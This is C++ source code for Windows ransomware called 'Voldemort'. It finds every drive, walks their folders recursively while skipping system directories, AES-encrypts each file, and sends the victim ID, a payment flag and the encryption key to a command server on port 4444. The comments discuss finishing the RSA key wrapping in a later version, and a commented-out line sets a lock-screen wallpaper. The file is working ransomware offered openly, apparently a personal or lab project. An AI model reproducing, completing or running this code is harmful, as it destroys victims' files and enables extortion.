#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <fstream>
#include "Victim.h"
#include "Shlwapi.h"
#include "RSA.h"
#include "AES.h"
#include <cstdio>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "user32.lib")  

std::string possibleDriveLetters[26] = { "A:/", "B:/", "C:/", "D:/", "E:/", "F:/", "G:/", "H:/",
                                         "I:/", "J:/", "K:/", "L:/", "M:/", "N:/", "O:/", "P:/",
                                         "Q:/", "R:/", "S:/", "T:/", "U:/", "V:/", "W:/", "X:/",
                                         "Y:/", "Z:/" };

/*
 These are the original excluded paths. I comment them because it took more
 than 10 minutes to encrypt. i added many excluded paths just to enhance the
 encryption time.
*/
//std::string excludedPaths[3] = { "Windows", "Program Files",
//                                 "Program Files (x86)" };

std::string excludedPaths[10] = { 
    "Windows",
    "Program Files",
    "Program Files (x86)",
    "AppData",           // Huge temp/cache folders
    "Temp",              // Temporary files
    "tmp",               // More temp files
    "Cache",             // Browser caches
    "Logs",              // Log files
    "Microsoft",         // Windows system folders
    "WinSxS"             // Windows component store (huge)
};

Victim g_victim;
int g_numberOfFiles = 0;
int g_numberOfFolders = 0;
std::vector<std::string> g_allFilePaths;

std::vector<std::string> GetActualPaths() {
    std::vector<std::string> _vActualPaths;
    for (int i = 0; i < 26; i++) {
        if (PathFileExistsA(possibleDriveLetters[i].c_str())) {
            _vActualPaths.push_back(possibleDriveLetters[i]);
        }
    }
    return _vActualPaths;
}

std::vector<std::string> vActualPaths = GetActualPaths();

bool IsExcludedPath(const std::string& path) {
    for (const std::string& excluded : excludedPaths) {
        if (path.find(excluded) != std::string::npos) {
            return true;
        }
    }
    return false;
}

void WalkDirectory(const std::string& directory, std::vector<std::string>& filePaths) {
    std::string searchPath = directory + "\\*";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(findData.cFileName, ".") == 0 ||
            strcmp(findData.cFileName, "..") == 0) {
            continue;
        }

        std::string fullPath = directory + "\\" + findData.cFileName;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!IsExcludedPath(fullPath)) {
                WalkDirectory(fullPath, filePaths);
            }
        }
        else {
            std::string fileName = findData.cFileName;
            if (fileName == "v01d3m0rt.exe" ||
                fileName == "d3crypt0r.exe") {
                continue;
            }

            filePaths.push_back(fullPath);
            g_numberOfFiles++;
            printf("\r[+] added %d files...", g_numberOfFiles);
        }

    } while (FindNextFileA(hFind, &findData) != 0);

    FindClose(hFind);
}

std::vector<std::string> GetRequiredPaths() {
    std::vector<std::string> _vRequiredPaths;

    for (const std::string& rootDir : vActualPaths) {
        std::string searchPath = rootDir + "*";
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (strcmp(findData.cFileName, ".") == 0 ||
                    strcmp(findData.cFileName, "..") == 0) {
                    continue;
                }

                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    bool isExcluded = false;
                    std::string folderName = findData.cFileName;

                    for (const std::string& excluded : excludedPaths) {
                        if (folderName == excluded) {
                            isExcluded = true;
                            break;
                        }
                    }

                    if (!isExcluded) {
                        std::string fullPath = rootDir + folderName;
                        _vRequiredPaths.push_back(fullPath);
                        g_numberOfFolders++;
                        printf("\r[+] added %d folders...", g_numberOfFolders);
                    }
                }
            } while (FindNextFileA(hFind, &findData) != 0);

            FindClose(hFind);
        }
    }

    printf("\n");
    return _vRequiredPaths;
}

std::vector<std::string> GetAllFilePaths() {
    std::vector<std::string> _vFilePaths;
    std::vector<std::string> requiredPaths = GetRequiredPaths();

    printf("\n");
    for (const std::string& path : requiredPaths) {
        printf("Required path --> \n", path.c_str());
    }

    printf("\n[+] Walking through directories recursively...\n");

    for (const std::string& requiredPath : requiredPaths) {
        WalkDirectory(requiredPath, _vFilePaths);
    }

    printf("\n");
    return _vFilePaths;
}

void SendDataToServer(std::vector<BYTE> encryptedAESKey) {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cout << "[-] WSAStartup failed. Error: " << result << std::endl;
        return;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444);

    // here you should consider your server ip address friendo:) 
    if (inet_pton(AF_INET, "192.168.217.129", &serverAddr.sin_addr) != 1) {
        std::cout << "[-] Invalid IP address\n";
        WSACleanup();
        return;
    }

    SOCKET connectSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (connectSocket == INVALID_SOCKET) {
        std::cout << "[-] Socket creation failed. Error: "
            << WSAGetLastError() << std::endl;
        WSACleanup();
        return;
    }

    if (connect(connectSocket,
        (sockaddr*)&serverAddr,
        sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cout << "[-] Connection failed. Error: " << WSAGetLastError() << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return;
    }

    std::cout << "[+] Connected to server\n";

    std::string victimID = g_victim.GetVictimID();
    std::string isPaid = "false";

    std::string hexKey;
    char hexChar[3];
    for (BYTE b : encryptedAESKey) {
        sprintf_s(hexChar, "%02x", b);
        hexKey += hexChar;
    }

    std::string dataToSend = victimID + ":" + isPaid + ":" + hexKey;

    int bytesSent = send(connectSocket, dataToSend.c_str(), dataToSend.length(), 0);
    if (bytesSent == SOCKET_ERROR) {
        std::cout << "[-] Send failed. Error: " << WSAGetLastError() << std::endl;
    }
    else {
        std::cout << "[+] Data sent (" << bytesSent << " bytes)\n";

        char buffer[1024];
        int bytesReceived = recv(connectSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            std::cout << "[+] Server response: " << buffer << std::endl;
        }
    }

    closesocket(connectSocket);
    WSACleanup();
    std::cout << "[+] Connection closed\n";
}

void Voldemort() {
    //std::cout << "HEY.." << std::endl;
    AES aes;
    std::vector<BYTE> aesKey = aes.GenerateKey();
    RSA rsa;

    if (!rsa.GenerateKeyPair()) {
        std::cout << "[-] Failed to generate RSA key pair!" << std::endl;
        return;
    }

    /*
      The step below must happen. But there were an issue i have been trying to solve for days.
      i could not encrypt the AES key with RSA public key.. so i just use AES raw key
      i will try to fix it in the next version....
    */

    //std::cout << "[+] Encrypting AES key with RSA..." << std::endl;
    //std::vector<BYTE> encryptedAESKey = rsa.EncryptAESKey(aesKey);
    //std::cout << "[+] AES key encrypted, size: " << encryptedAESKey.size() << std::endl;

    std::cout << "Getting file paths..." << std::endl;
    g_allFilePaths = GetAllFilePaths();
    std::cout << "Found " << g_allFilePaths.size() << " files" << std::endl;

    std::cout << "[+ voldemort] is encrypting files..." << std::endl;
    for (const std::string& file : g_allFilePaths) {
        aes.EncryptFile(file);
    }
    std::cout << "File encryption complete" << std::endl;

    // Here, the encrypted AES key must be sent.. not the AES key itself
    std::cout << "Sending data to server..." << std::endl;
    SendDataToServer(aesKey);
    std::cout << "Done!" << std::endl;
}

int main() {
    //SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)L"C:\\Users\\VirtualMe\\locked_img.jpeg", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    Voldemort();
    return 0;
}
